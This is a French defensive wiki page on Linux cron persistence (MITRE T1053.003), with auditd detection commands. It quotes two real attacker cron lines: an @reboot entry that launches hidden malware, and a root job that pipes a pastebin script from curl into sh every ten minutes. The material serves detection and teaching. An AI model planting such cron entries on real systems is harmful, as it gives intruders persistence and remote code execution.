---
title: "Tâche cron"
description: "L'attaquant ajoute une tâche cron qui relance son malware au démarrage ou à intervalle régulier : la méthode de persistance la plus courante sous Linux."
tags: [linux, persistance, cron, auditd]
updated: 2026-11-23
draft: false
type: technique
attack_id: T1053.003
tactic: persistence
severity: high
platforms: [Linux]
data_sources: [auditd]
related:
  - 03-menaces-detection/persistence/service-systemd
  - 03-menaces-detection/persistence/tache-planifiee
---

## Description

Les tâches cron sont l'équivalent Linux des tâches planifiées de Windows : la façon la plus simple de lancer un programme à heure fixe, et la méthode de persistance la plus utilisée. Un serveur Linux peut tourner des années sans redémarrer ; les attaquants qui visent un accès de longue durée ajoutent tout de même une ou deux portes dérobées.

Exemples réels :

```text title="APT29 (GoldMax) : ligne ajoutée à /var/spool/cron/<utilisateur>, lance le malware au démarrage"
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
```

```bash title="Rocke (mineur) : retélécharge son script toutes les 10 minutes, en root"
echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
```

`*/10` : toutes les 10 minutes, sans doute pour se réinstaller vite si l'équipe informatique supprime ses fichiers.

## Ce qu'on observe

Une tâche cron est un simple fichier texte. Deux traces possibles :

- **Une modification** d'un fichier cron : `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*`.
- **Un processus** qui gère les tâches : `crontab -e`, `nano /etc/crontab`.

```text title="crontab -e dans auditd"
root@thm-vm:~$ ausearch -i -x crontab
type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e
type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec
```

## Détection

### auditd

```bash title="les lancements de crontab"
ausearch -i -x crontab
```

```bash title="les modifications d'un fichier ou d'un dossier cron"
ausearch -i -f /etc/cron.d
```

Puis lire la ligne ajoutée : programme lancé, dossier caché, `@reboot`, téléchargement depuis Internet.

### Splunk (requête prête)

Requête : tâches cron qui lancent un script ou un interpréteur, dans `syslog`. Voir [Splunk — requêtes d'investigation](../../02-outils/splunk-requetes.md#linux).

## Faux positifs

À compléter.

## Réponse

À compléter.
